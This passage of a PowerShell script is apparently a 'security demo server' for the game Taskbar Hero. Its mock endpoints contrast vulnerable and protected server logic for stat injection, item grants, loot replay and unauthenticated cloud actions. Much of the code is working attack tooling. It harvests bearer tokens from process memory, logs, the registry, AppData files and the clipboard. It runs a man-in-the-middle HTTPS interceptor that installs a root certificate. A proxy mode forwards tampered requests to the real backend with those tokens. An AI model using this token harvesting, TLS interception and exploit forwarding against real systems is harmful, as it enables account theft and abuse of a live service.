        -ErrorAction Stop
      $script:proxySiteThumb = $site.Thumbprint

      $pfxPath = Join-Path $env:TEMP "thb_proxy.pfx"
      $site | Export-PfxCertificate -FilePath $pfxPath `
        -Password (ConvertTo-SecureString $pfxPass -AsPlainText -Force) `
        -ErrorAction Stop | Out-Null
      $script:proxyCertPath = $pfxPath
    } else {
      Write-Host "  [PROXY] Using pre-built cert: $pfxPath" -ForegroundColor Cyan
      $script:proxyCertPath = $pfxPath
      $script:proxyCAThumb  = $PrebuiltCAThumb
    }

    # Set system proxy
    Set-SystemProxy -Enable $true -Port $ProxyPort

    # Start C# proxy
    [HttpsProxy]::Start($ProxyPort, $pfxPath, $pfxPass)
    Write-Host "  [PROXY] HTTPS interceptor running on port $ProxyPort" -ForegroundColor Cyan
    return @{ ok=$true; msg="started on port $ProxyPort"; pfxPath=$pfxPath }
  } catch {
    Write-Host "  [PROXY] Error: $_" -ForegroundColor Red
    return @{ ok=$false; error="$_" }
  }
}

function Stop-HttpsInterceptor {
  if (-not [HttpsProxy]::IsRunning) { return }
  [HttpsProxy]::Stop()
  Set-SystemProxy -Enable $false

  # Remove CA from trusted roots
  if ($script:proxyCAThumb) {
    $s = [System.Security.Cryptography.X509Certificates.X509Store]::new("Root","CurrentUser")
    $s.Open("ReadWrite")
    $c = $s.Certificates | Where-Object { $_.Thumbprint -eq $script:proxyCAThumb }
    if ($c) { $s.Remove($c) }
    $s.Close()
  }
  # Remove certs from My store
  foreach ($thumb in @($script:proxyCAThumb, $script:proxySiteThumb)) {
    if (-not $thumb) { continue }
    $s = [System.Security.Cryptography.X509Certificates.X509Store]::new("My","CurrentUser")
    $s.Open("ReadWrite")
    $c = $s.Certificates | Where-Object { $_.Thumbprint -eq $thumb }
    if ($c) { $s.Remove($c) }
    $s.Close()
  }
  # Remove PFX
  if ($script:proxyCertPath -and (Test-Path $script:proxyCertPath)) {
    Remove-Item $script:proxyCertPath -Force -ErrorAction SilentlyContinue
  }
  $script:proxyCAThumb = $null; $script:proxySiteThumb = $null; $script:proxyCertPath = $null
  Write-Host "  [PROXY] Stopped and cleaned up" -ForegroundColor Yellow
}

function Find-GameProcess {
  # Custom override via /api/set-process
  if ($script:customProcessName) {
    $proc = Get-Process -Name $script:customProcessName -ErrorAction SilentlyContinue
    if ($proc) { return @($proc)[0] }
  }
  # Try known names first
  $names = @("Taskbar Hero", "TaskbarHero", "THB", "TaskbarHero-Win64-Shipping",
             "Taskbar_Hero", "taskbarhero", "thb", "THB-Win64-Shipping")
  foreach ($name in $names) {
    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
    if ($proc) { return @($proc)[0] }
  }
  # Fallback: any process with Unity player log beside it (heuristic)
  $logPath = Join-Path $env:USERPROFILE "AppData\LocalLow\*\*\Player.log"
  $logs = Get-Item -Path $logPath -ErrorAction SilentlyContinue
  if ($logs) {
    foreach ($log in @($logs)) {
      $companyDir = Split-Path (Split-Path $log.FullName)
      $gameName   = Split-Path $companyDir -Leaf
      $proc = Get-Process -Name $gameName -ErrorAction SilentlyContinue
      if ($proc) { return @($proc)[0] }
    }
  }
  return $null
}

function Get-TokenFromProcess {
  $proc = Find-GameProcess
  if ($null -eq $proc) { return $null }
  try {
    return [MemSearch]::FindBearer($proc.Id)
  } catch {
    return $null
  }
}

function Get-TokenFromLogs {
  $pattern = Join-Path $env:USERPROFILE "AppData\LocalLow\*\*\Player.log"
  $logs = Get-Item -Path $pattern -ErrorAction SilentlyContinue
  if (-not $logs) { return $null }
  foreach ($log in @($logs)) {
    try {
      $content = Get-Content -Path $log.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
      if ($null -ne $content -and $content -match "(Bearer\s+eyJ[\w\-\.]+)") {
        return $Matches[1].Trim()
      }
    } catch {}
  }
  return $null
}

function Get-TokenFromRegistry {
  # Unity PlayerPrefs on Windows: HKCU:\Software\[Company]\[Product]
  # BACKND SDK stores tokens as plain REG_SZ with key like "token_h12345678"
  # We scan all string values at depth 2 under HKCU:\Software for JWT pattern
  $jwtRx = [System.Text.RegularExpressions.Regex]::new(
    "eyJ[\w\-\.\+\/=]{10,}\.[\w\-\.\+\/=]{10,}\.[\w\-\.\+\/=]{10,}",
    [System.Text.RegularExpressions.RegexOptions]::None)
  $bases = @("HKCU:\Software")
  foreach ($base in $bases) {
    $companies = Get-ChildItem -Path $base -ErrorAction SilentlyContinue
    foreach ($company in $companies) {
      $games = Get-ChildItem -Path $company.PSPath -ErrorAction SilentlyContinue
      foreach ($game in $games) {
        try {
          $props = Get-ItemProperty -Path $game.PSPath -ErrorAction SilentlyContinue
          if (-not $props) { continue }
          foreach ($prop in $props.PSObject.Properties) {
            if ($prop.Name -match '^PS') { continue }
            $val = "$($prop.Value)"
            $m = $jwtRx.Match($val)
            if ($m.Success) {
              Write-Host "  [TOKEN] Registry hit: $($game.PSPath) / $($prop.Name)" -ForegroundColor Cyan
              return "Bearer $($m.Value)"
            }
          }
        } catch {}
      }
    }
  }
  return $null
}

function Get-TokenFromPersistentData {
  # BACKND saves session data in Application.persistentDataPath = AppData\LocalLow\[Company]\[Game]\
  $jwtRx = [System.Text.RegularExpressions.Regex]::new(
    "eyJ[\w\-\.\+\/=]{10,}\.[\w\-\.\+\/=]{10,}\.[\w\-\.\+\/=]{10,}",
    [System.Text.RegularExpressions.RegexOptions]::None)
  $exts = @("*.json","*.dat","*.txt","*.bytes","*.save")
  $basePath = Join-Path $env:USERPROFILE "AppData\LocalLow"
  $files = @()
  foreach ($ext in $exts) {
    $files += Get-ChildItem -Path $basePath -Filter $ext -Recurse -Depth 3 -ErrorAction SilentlyContinue |
              Where-Object { $_.Length -lt 1048576 }  # skip files > 1 MB
  }
  foreach ($file in $files) {
    try {
      $content = Get-Content -Path $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
      if (-not $content) { continue }
      $m = $jwtRx.Match($content)
      if ($m.Success) {
        Write-Host "  [TOKEN] File hit: $($file.FullName)" -ForegroundColor Cyan
        return "Bearer $($m.Value)"
      }
    } catch {}
  }
  return $null
}

# ---- Proxy helper -----------------------------------------------------------
function Invoke-Proxy {
  param([string]$Uri, [string]$Method, [string]$Token, [string]$BodyJson)
  $headers = @{ "Content-Type" = "application/json" }
  if ($Token) { $headers["Authorization"] = $Token }
  try {
    $r = Invoke-WebRequest -Uri $Uri -Method $Method -Headers $headers -Body $BodyJson `
         -UseBasicParsing -ErrorAction Stop
    return @{ ok=$true; status=[int]$r.StatusCode; body=($r.Content | ConvertFrom-Json) }
  } catch {
    $code = 0
    $msg  = $_.Exception.Message
    try { $code = [int]$_.Exception.Response.StatusCode } catch {}
    return @{ ok=$false; status=$code; error=$msg }
  }
}

# ---- Start listener ---------------------------------------------------------
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://localhost:$Port/")
$listener.Start()

Write-Host ""
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Taskbar Hero  |  Security Demo Server  |  v3.0" -ForegroundColor White
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Open report:  http://localhost:$Port/" -ForegroundColor Green
Write-Host ""
Write-Host "  /api/vuln/*     mock vulnerable responses" -ForegroundColor Red
Write-Host "  /api/fixed/*    mock protected responses" -ForegroundColor Green
Write-Host "  /api/proxy/*    forward to real backend (needs X-Real-Token)" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Ctrl+C to stop" -ForegroundColor DarkGray
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host ""

Start-Process "http://localhost:$Port/"

try {
  while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    $req = $ctx.Request
    $res = $ctx.Response
    Add-Cors $res

    $method = $req.HttpMethod
    $path   = $req.Url.LocalPath
    $ts     = [DateTime]::Now.ToString("HH:mm:ss")

    # OPTIONS preflight
    if ($method -eq "OPTIONS") { $res.StatusCode = 204; $res.Close(); continue }

    # Color-coded log
    $clr = if ($path -match "/proxy/") { "Yellow" }
           elseif ($path -match "/vuln/") { "Red" }
           elseif ($path -match "/fixed/") { "Green" }
           else { "Gray" }
    Write-Host "[$ts] $method $path" -ForegroundColor $clr

    # -- Serve HTML -----------------------------------------------------------
    if ($path -eq "/" -or $path -eq "/index.html") {
      if (Test-Path $htmlFile) {
        Send-Html $res (Get-Content $htmlFile -Raw -Encoding UTF8)
      } else {
        Send-Json $res @{ error = "security-report.html not found in $scriptDir" } 404
      }
      continue
    }

    $body      = Read-Body $req
    $bodyJson  = if ($body) { $body | ConvertTo-Json -Compress } else { "{}" }
    $realToken = $req.Headers["X-Real-Token"]

    # =========================================================================
    # PROXY MODE  /api/proxy/*  -> forward to real backend
    # =========================================================================
    if ($path -match "^/api/proxy/(.+)$") {
      $sub = $matches[1]

      if (-not $realToken -and $script:capturedToken) {
        $realToken = $script:capturedToken
        Write-Host "  [PROXY] Using auto-captured token" -ForegroundColor Cyan
      }
      if (-not $realToken) {
        Send-Json $res @{ error = "No token available - send X-Real-Token header or auto-capture via clipboard" } 401
        continue
      }

      # Choose real endpoint
      $realUri = switch -Wildcard ($sub) {
        "equip"          { "$REAL_BACKEND/v1/user/equip" }
        "user/data"      { "$REAL_BACKEND/v1/user/data" }
        "inventory"      { "$REAL_BACKEND/v1/inventory/receive" }
        "probability"    { "$REAL_BACKEND/v1/probability" }
        "loot/collect"   { "$REAL_BACKEND/v1/loot/collect" }
        "aws/action"     { "$REAL_AWS/action" }
        default          { "$REAL_BACKEND/v1/$sub" }
      }

      $proxyMethod = if ($sub -eq "user/data") { "PATCH" } else { "POST" }
      $result = Invoke-Proxy -Uri $realUri -Method $proxyMethod -Token $realToken -BodyJson $bodyJson

      Send-Json $res @{
        _mode        = "REAL SERVER RESPONSE"
        _forwarded_to = $realUri
        http_status  = $result.status
        real_response = $result.body
        error        = $result.error
      } (if ($result.ok) { $result.status } else { 502 })
      continue
    }

    # =========================================================================
    # LOCAL MOCK ENDPOINTS
    # =========================================================================

    # -- TBH-012: Equipment Stat Injection ------------------------------------
    if ($path -match "^/api/(vuln|fixed)/equip$") {
      $mode   = $matches[1]
      $itemId = "$($body.itemId)"
      $slot   = "$($body.slot)"
      $cs     = $body.stats

      if ($mode -eq "vuln") {
        Send-Json $res @{
          _mode         = "VULNERABLE"
          status        = 200
          message       = "Equipment updated"
          stored        = @{ slot=$slot; itemId=$itemId; stats=$cs }
          WARNING       = "Server saved client-provided stats without any validation!"
          battle_damage = [int]($cs.atk)
        }
      } else {
        if (-not $ITEM_DB.ContainsKey($itemId)) {
          Send-Json $res @{ _mode="PROTECTED"; status=422; error="Unknown item: $itemId"; rejected=$true } 422
        } elseif ($ITEM_DB[$itemId].slot -ne $slot) {
          Send-Json $res @{ _mode="PROTECTED"; status=422; error="Wrong slot '$slot' for $itemId (need '$($ITEM_DB[$itemId].slot)')"; rejected=$true } 422
        } else {
          $real = $ITEM_DB[$itemId]
          $tampered = ($cs -ne $null) -and (
            [int]($cs.atk) -ne $real.atk -or
            [int]($cs.def) -ne $real.def -or
            [int]($cs.hp)  -ne $real.hp
          )
          Send-Json $res @{
            _mode              = "PROTECTED"
            status             = 200
            message            = "Equipped with server-authoritative stats"
            stored             = @{ slot=$slot; itemId=$itemId; stats=@{ atk=$real.atk; def=$real.def; hp=$real.hp; mgk=$real.mgk } }
            client_stats_IGNORED = $cs
            attack_detected    = $tampered
            note               = if ($tampered) { "ATTACK BLOCKED: client sent atk=$([int]($cs.atk)), server applied atk=$($real.atk) from ITEM_DB" } else { "Stats match ITEM_DB" }
            battle_damage      = $real.atk
          }
        }
      }
      continue
    }

    # -- TBH-001: Max HP Manipulation -----------------------------------------
    if ($path -match "^/api/(vuln|fixed)/user/data$") {
      $mode  = $matches[1]
      $cHp   = [int]($(if ($null -ne $body.maxHp)     { $body.maxHp }     else { 0 }))
      $cCur  = [int]($(if ($null -ne $body.currentHp) { $body.currentHp } else { 0 }))
      $realHp = $USER.baseHp + ($USER.level * $USER.hpPerLevel) + $USER.equipBonus

      if ($mode -eq "vuln") {
        Send-Json $res @{
          _mode     = "VULNERABLE"
          status    = 200
          maxHp     = $cHp
          currentHp = $cCur
          WARNING   = "Server stored maxHp=$cHp from client without recalculation!"
        }
      } else {
        Send-Json $res @{
          _mode                = "PROTECTED"
          status               = 200
          maxHp                = $realHp
          currentHp            = [Math]::Min($cCur, $realHp)
          formula              = "baseHp($($USER.baseHp)) + level($($USER.level)) x hpPerLevel($($USER.hpPerLevel)) + equip($($USER.equipBonus)) = $realHp"
          client_maxHp_IGNORED = $cHp
          attack_detected      = ($cHp -gt $realHp * 2)
        }
      }
      continue
    }

    # -- TBH-008: Inventory Item Injection ------------------------------------
    if ($path -match "^/api/(vuln|fixed)/inventory$") {
      $mode  = $matches[1]
      $items = $body.items

      if ($mode -eq "vuln") {
        $total = 0
        if ($items) { foreach ($i in $items) { $total += [int]($i.qty) } }
        Send-Json $res @{
          _mode         = "VULNERABLE"
          status        = 200
          added         = $items
          total_granted = $total
          WARNING       = "Server granted $total items directly from client request!"
        }
      } else {
        Send-Json $res @{
          _mode        = "PROTECTED"
          status       = 403
          error        = "Direct item granting is not allowed"
          correct_flow = "POST /v1/actions/monster-kill -> server rolls drop -> server grants items internally"
          rejected     = $true
        } 403
      }
      continue
    }

    # -- TBH-005: Probability Table Swap --------------------------------------
    if ($path -match "^/api/(vuln|fixed)/probability$") {
      $mode      = $matches[1]
      $clientKey = "$($body.probabilityKey)"
      $zoneId    = "$($body.zoneId)"
      $chestId   = "$($body.context)"

      if ($mode -eq "vuln") {
        Send-Json $res @{
          _mode      = "VULNERABLE"
          status     = 200
          table_used = $clientKey
          result     = @{ itemId="WPN_KNT_LEG_001"; name="Excalibur Shard"; rarity="Legendary" }
          WARNING    = "Server used client-provided probabilityKey: '$clientKey'"
        }
      } else {
        $realKey = $null
        if ($CHEST_MAP.ContainsKey($zoneId) -and $CHEST_MAP[$zoneId].ContainsKey($chestId)) {
          $realKey = $CHEST_MAP[$zoneId][$chestId]
        }
        if (-not $realKey) {
          Send-Json $res @{ _mode="PROTECTED"; status=422; error="Invalid zone/chest context: $zoneId/$chestId"; rejected=$true } 422
        } else {
          $drop = $DROP_TABLE[$realKey]
          Send-Json $res @{
            _mode               = "PROTECTED"
            status              = 200
            client_key_IGNORED  = $clientKey
            table_used          = $realKey
            table_source        = "CHEST_MAP[$zoneId][$chestId]"
            result              = $drop
            note                = "Client sent '$clientKey', server mapped to '$realKey'"
          }
        }
      }
      continue
    }

    # -- TBH-011: Replay Attack -----------------------------------------------
    if ($path -match "^/api/(vuln|fixed)/loot/collect$") {
      $mode    = $matches[1]
      $eventId = "$($body.eventId)"
      $chestId = "$($body.chestId)"

      if ($mode -eq "vuln") {
        Send-Json $res @{
          _mode     = "VULNERABLE - no idempotency"
          status    = 200
          message   = "Loot collected"
          granted   = @{ itemId="WPN_KNT_COM_002"; name="Steel Sword"; qty=1 }
          WARNING   = "No eventId check - send again to duplicate the reward!"
          eventId   = $eventId
        }
      } else {
        $key = "loot:$eventId"
        if ($seenEvents.ContainsKey($key)) {
          Send-Json $res @{
            _mode        = "PROTECTED - idempotency"
            status       = 409
            error        = "Already processed"
            eventId      = $eventId
            processed_at = "$($seenEvents[$key])"
            note         = "REPLAY BLOCKED: this eventId was already used"
            rejected     = $true
          } 409
        } else {
          $seenEvents[$key] = [DateTime]::UtcNow.ToString("o")
          Send-Json $res @{
            _mode     = "PROTECTED - idempotency"
            status    = 200
            message   = "Loot collected and event marked processed"
            granted   = @{ itemId="WPN_KNT_COM_002"; name="Steel Sword"; qty=1 }
            eventId   = $eventId
            note      = "Repeat this request to get 409 Conflict"
          }
        }
      }
      continue
    }

    # -- TBH-006: AWS Gateway Unauthorized ------------------------------------
    if ($path -match "^/api/(vuln|fixed)/aws/action$") {
      $mode   = $matches[1]
      $auth   = $req.Headers["Authorization"]
      $action = "$($body.action)"
      $userId = "$($body.userId)"

      if ($mode -eq "vuln") {
        Send-Json $res @{
          _mode     = "VULNERABLE - no Lambda authorizer"
          status    = 200
          executed  = $true
          action    = $action
          userId    = $userId
          WARNING   = "Lambda executed '$action' for '$userId' without token verification!"
        }
      } else {
        if (-not $auth -or -not $auth.StartsWith("Bearer ")) {
          Send-Json $res @{ _mode="PROTECTED"; status=401; error="Missing Authorization header"; rejected=$true } 401
        } elseif ($auth -ne "Bearer demo-token") {
          Send-Json $res @{ _mode="PROTECTED"; status=403; error="Invalid or expired token"; rejected=$true } 403
        } else {
          Send-Json $res @{
            _mode            = "PROTECTED"
            status           = 200
            executed         = $true
            action           = $action
            authenticated_as = "demo_user"
            note             = "Change Authorization to 'Bearer invalid' to test rejection"
          }
        }
      }
      continue
    }

    # -- GET /api/status — token capture + server health ----------------------
    if ($path -eq "/api/status" -and $method -eq "GET") {
      $gameProc    = Find-GameProcess
      $gameRunning = ($null -ne $gameProc)

      # 0. Check HTTPS proxy (highest priority — direct from HTTP header)
      if ($null -eq $script:capturedToken -and [HttpsProxy]::IsRunning -and $null -ne [HttpsProxy]::CapturedToken) {
        $script:capturedToken = [HttpsProxy]::CapturedToken
        $script:capturedAt    = [HttpsProxy]::CapturedAt
        $script:captureMethod = "https-proxy"
        Write-Host "  [TOKEN] Captured via HTTPS proxy at $($script:capturedAt)" -ForegroundColor Green
      }

      # 1. Try process memory scan
      if ($null -eq $script:capturedToken) {
        $procToken = Get-TokenFromProcess
        if ($null -ne $procToken) {
          $script:capturedToken = $procToken
          $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
          $script:captureMethod = "process"
          Write-Host "  [TOKEN] Captured from process memory at $($script:capturedAt)" -ForegroundColor Cyan
        }
      }
      # 2. Try Player.log
      if ($null -eq $script:capturedToken) {
        $logToken = Get-TokenFromLogs
        if ($null -ne $logToken) {
          $script:capturedToken = $logToken
          $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
          $script:captureMethod = "log"
          Write-Host "  [TOKEN] Captured from Player.log at $($script:capturedAt)" -ForegroundColor Cyan
        }
      }
      # 3. Try Unity PlayerPrefs registry (BACKND stores token as REG_SZ)
      if ($null -eq $script:capturedToken) {
        $regToken = Get-TokenFromRegistry
        if ($null -ne $regToken) {
          $script:capturedToken = $regToken
          $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
          $script:captureMethod = "registry"
          Write-Host "  [TOKEN] Captured from registry at $($script:capturedAt)" -ForegroundColor Cyan
        }
      }
      # 4. Try persistent data files (AppData\LocalLow)
      if ($null -eq $script:capturedToken) {
        $fileToken = Get-TokenFromPersistentData
        if ($null -ne $fileToken) {
          $script:capturedToken = $fileToken
          $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
          $script:captureMethod = "persistent-data"
          Write-Host "  [TOKEN] Captured from persistent data at $($script:capturedAt)" -ForegroundColor Cyan
        }
      }
      # 5. Try clipboard
      if ($null -eq $script:capturedToken) {
        $clipToken = Get-TokenFromClipboard
        if ($null -ne $clipToken) {
          $script:capturedToken = $clipToken
          $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
          $script:captureMethod = "clipboard"
          Write-Host "  [TOKEN] Captured from clipboard at $($script:capturedAt)" -ForegroundColor Cyan
        }
      }

      $masked = $null
      if ($null -ne $script:capturedToken) {
        $t      = $script:capturedToken
        $tail   = $t.Substring([Math]::Max(0, $t.Length - 8))
        $masked = "Bearer ***" + $tail
      }
      Send-Json $res @{
        status        = "live"
        hasToken      = ($null -ne $script:capturedToken)
        tokenMasked   = $masked
        capturedAt    = $script:capturedAt
        captureMethod = $script:captureMethod
        gameRunning   = $gameRunning
      }
      continue
    }

    # -- POST /api/clear-token — wipe captured token --------------------------
    if ($path -eq "/api/clear-token" -and $method -eq "POST") {
      $script:capturedToken = $null
      $script:capturedAt    = $null
      $script:captureMethod = $null
      Write-Host "  [TOKEN] Cleared by client" -ForegroundColor Yellow
      Send-Json $res @{ cleared = $true }
      continue
    }

    # -- POST /api/interceptor/start — start HTTPS MITM proxy -----------------
    if ($path -eq "/api/interceptor/start" -and $method -eq "POST") {
      # Accept prebuilt cert info from JSON body or temp file
      $certJson = $null
      try {
        $bodyRaw = (New-Object System.IO.StreamReader($ctx.Request.InputStream)).ReadToEnd()
        if ($bodyRaw -and $bodyRaw.Trim().StartsWith("{")) {
          $certJson = $bodyRaw | ConvertFrom-Json
        }
      } catch {}
      # Fall back to temp cert file generated externally
      if (-not $certJson) {
        $certFile = "C:\Users\Gigabyte\AppData\Local\Temp\thb_proxy_certs.json"
        if (Test-Path $certFile) {
          $certJson = Get-Content $certFile -Raw | ConvertFrom-Json
        }
      }
      if ($certJson -and $certJson.pfxPath -and (Test-Path $certJson.pfxPath)) {
        $result = Start-HttpsInterceptor -PrebuiltPfxPath $certJson.pfxPath -PrebuiltPfxPass $certJson.pfxPass -PrebuiltCAThumb $certJson.caThumb
      } else {
        $result = Start-HttpsInterceptor
      }
      Send-Json $res @{
        ok      = $result.ok
        running = [HttpsProxy]::IsRunning
        msg     = $result.msg
        error   = $result.error
      }
      continue
    }

    # -- POST /api/interceptor/stop — stop HTTPS MITM proxy -------------------
    if ($path -eq "/api/interceptor/stop" -and $method -eq "POST") {
      Stop-HttpsInterceptor
      Send-Json $res @{ ok = $true; running = $false }
      continue
    }

    # -- GET /api/interceptor/status ------------------------------------------
    if ($path -eq "/api/interceptor/status" -and $method -eq "GET") {
      Send-Json $res @{
        running  = [HttpsProxy]::IsRunning
        reqCount = [HttpsProxy]::RequestCount
        hasToken = ($null -ne [HttpsProxy]::CapturedToken)
      }
      continue
    }

    # -- POST /api/set-process — override game process name for memory scan ---
    if ($path -eq "/api/set-process" -and $method -eq "POST") {
      $name = "$($body.name)".Trim()
      if ($name) {
        $script:customProcessName = $name
        $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
        if ($proc) {
          Write-Host "  [PROC] Custom process set: $name (PID $(@($proc)[0].Id))" -ForegroundColor Cyan
          Send-Json $res @{ ok=$true; found=$true; pid=@($proc)[0].Id }
        } else {
          Write-Host "  [PROC] Custom process set: $name (not running yet)" -ForegroundColor Yellow
          Send-Json $res @{ ok=$true; found=$false }
        }
      } else {
        $script:customProcessName = $null
        Send-Json $res @{ ok=$true; cleared=$true }
      }
      continue
    }

    # -- GET /api/debug/processes — list running processes for diagnostics ----
    if ($path -eq "/api/debug/processes" -and $method -eq "GET") {
      $gameProc = Find-GameProcess
      $procs = Get-Process | Where-Object { $_.MainWindowTitle -or $_.Id -gt 4 } |
        Sort-Object CPU -Descending |
        Select-Object -First 60 |
        ForEach-Object {
          @{
            pid   = $_.Id
            name  = $_.ProcessName
            title = $_.MainWindowTitle
            mem   = [math]::Round($_.WorkingSet64 / 1MB, 1)
          }
        }
      Send-Json $res @{
        foundGameProcess = if ($gameProc) { @{ pid=$gameProc.Id; name=$gameProc.ProcessName } } else { $null }
        processes = @($procs)
      }
      continue
    }

    # -- POST /api/set-token (manual paste from browser) ----------------------
    if ($path -eq "/api/set-token" -and $method -eq "POST") {
      $tok = "$($body.token)".Trim()
      if ($tok -match "^Bearer\s+eyJ") {
        $script:capturedToken = $tok
        $script:capturedAt    = [DateTime]::Now.ToString("HH:mm:ss")
        $script:captureMethod = "manual"
        Write-Host "  [TOKEN] Set manually at $($script:capturedAt)" -ForegroundColor Green
        Send-Json $res @{ ok = $true; capturedAt = $script:capturedAt }
      } else {
        Send-Json $res @{ ok = $false; error = "Expected Bearer eyJ..." } 400
      }
      continue
    }

    # -- GET /api/player/state ------------------------------------------------
    if ($path -eq "/api/player/state" -and $method -eq "GET") {
      Send-Json $res $script:playerState
      continue
    }

    # -- POST /api/player/equip (VULNERABLE) ----------------------------------
    if ($path -eq "/api/player/equip" -and $method -eq "POST") {
      $slot       = "$($body.slot)"
      $validSlots = @("weapon","armor","boots","helmet","gloves","accessory")
      if ($slot -and ($validSlots -contains $slot)) {
        $item = @{
          itemId     = "$($body.itemId)"
          name       = "$($body.name)"
          rarity     = "$($body.rarity)"
          slot       = $slot
          atk        = [int]$body.atk
          def        = [int]$body.def
          hp         = [int]$body.hp
          mgk        = [int]$body.mgk
          durability = if ($null -ne $body.durability) { [int]$body.durability } else { 100 }
          durMax     = if ($null -ne $body.durMax)     { [int]$body.durMax }     else { 100 }
        }
        $script:playerState.equipped[$slot] = $item
        Send-Json $res @{
          _mode    = "VULNERABLE"
          accepted = $true
          equipped = $script:playerState.equipped[$slot]
        }
      } else {
        Send-Json $res @{ error = "Invalid slot: $slot" } 400
      }
      continue
    }

    # -- POST /api/player/grant (VULNERABLE) ----------------------------------
    if ($path -eq "/api/player/grant" -and $method -eq "POST") {
      $item = @{
        itemId     = "$($body.itemId)"
        name       = "$($body.name)"
        rarity     = "$($body.rarity)"
        qty        = if ($null -ne $body.qty) { [int]$body.qty } else { 1 }
        durability = if ($null -ne $body.durability) { [int]$body.durability } else { 100 }
        durMax     = if ($null -ne $body.durMax)     { [int]$body.durMax }     else { 100 }
      }
      $script:playerState.inventory = @($script:playerState.inventory) + @($item)
      Send-Json $res @{
        _mode           = "VULNERABLE"
        accepted        = $true
        item            = $item
        inventory_count = @($script:playerState.inventory).Count
      }
      continue
    }

    # -- POST /api/chest/open (VULNERABLE) ------------------------------------
    if ($path -eq "/api/chest/open" -and $method -eq "POST") {
      $chestId      = "$($body.chestId)"
      $forcedItemId = "$($body.forcedItemId)"
      $forcedRarity = "$($body.forcedRarity)"
      $rarCode      = @{ Common="COM"; Uncommon="UNC"; Rare="RAR"; Epic="EPC"; Legendary="LEG" }

      if ($forcedItemId -and $script:ITEM_DB.ContainsKey($forcedItemId)) {
        $it  = $script:ITEM_DB[$forcedItemId]
        $rar = if ($forcedRarity) { $forcedRarity } else { "Common" }
        $drop = @{ itemId=$forcedItemId; name=$it.name; rarity=$rar; atk=$it.atk; def=$it.def; hp=$it.hp }
      } else {
        $code = if ($forcedRarity -and $rarCode.ContainsKey($forcedRarity)) { $rarCode[$forcedRarity] } else { "COM" }
        $pool = @($script:ITEM_DB.GetEnumerator() | Where-Object { $_.Key -match "_${code}_" })
        if ($pool.Count -gt 0) {
          $pick = $pool[(Get-Random -Maximum $pool.Count)]
          $drop = @{ itemId=$pick.Key; name=$pick.Value.name; rarity=$forcedRarity; atk=$pick.Value.atk; def=$pick.Value.def; hp=$pick.Value.hp }
        } else {
          $drop = @{ itemId="WPN_KNT_COM_001"; name="Iron Sword"; rarity="Common"; atk=12; def=0; hp=0 }
        }
      }
      Send-Json $res @{
        _mode   = "VULNERABLE"
        chestId = $chestId
        drop    = $drop
        WARNING = "Client controlled drop"
      }
      continue
    }

    # -- POST /api/chest/open/fixed (PROTECTED) -------------------------------
    if ($path -eq "/api/chest/open/fixed" -and $method -eq "POST") {
      $chestId      = "$($body.chestId)"
      $rarCode      = @{ Common="COM"; Uncommon="UNC"; Rare="RAR"; Epic="EPC"; Legendary="LEG" }
      $tierRarities = @{
        "wood" = @("Common","Uncommon")
        "gold" = @("Rare","Epic")
        "boss" = @("Epic","Legendary")
      }
      $tier = "wood"
      if ($chestId -match "gold") { $tier = "gold" }
      elseif ($chestId -match "boss") { $tier = "boss" }

      $rarities     = $tierRarities[$tier]
      $pickedRarity = $rarities[(Get-Random -Maximum $rarities.Count)]
      $code         = $rarCode[$pickedRarity]
      $pool         = @($script:ITEM_DB.GetEnumerator() | Where-Object { $_.Key -match "_${code}_" })
      if ($pool.Count -gt 0) {
        $pick = $pool[(Get-Random -Maximum $pool.Count)]
        $drop = @{ itemId=$pick.Key; name=$pick.Value.name; rarity=$pickedRarity; atk=$pick.Value.atk; def=$pick.Value.def; hp=$pick.Value.hp }
      } else {
        $drop = @{ itemId="WPN_KNT_COM_001"; name="Iron Sword"; rarity="Common"; atk=12; def=0; hp=0 }
      }
      Send-Json $res @{
        _mode   = "PROTECTED"
        chestId = $chestId
        drop    = $drop
        note    = "Drop decided server-side"
      }
      continue
    }

    # -- 404 ------------------------------------------------------------------
    Send-Json $res @{
      error = "Endpoint not found: $path"
      available = @(
        "GET  /",
        "POST /api/vuln/equip",         "POST /api/fixed/equip",
        "PATCH /api/vuln/user/data",    "PATCH /api/fixed/user/data",
        "POST /api/vuln/inventory",     "POST /api/fixed/inventory",
        "POST /api/vuln/probability",   "POST /api/fixed/probability",
        "POST /api/vuln/loot/collect",  "POST /api/fixed/loot/collect",
        "POST /api/vuln/aws/action",    "POST /api/fixed/aws/action",
        "POST /api/proxy/{endpoint}     (X-Real-Token required)"
      )
    } 404
  }
} finally {
  $listener.Stop()
  Stop-HttpsInterceptor   # restore system proxy + remove CA cert
  Write-Host ""
  Write-Host "Server stopped." -ForegroundColor Yellow
}
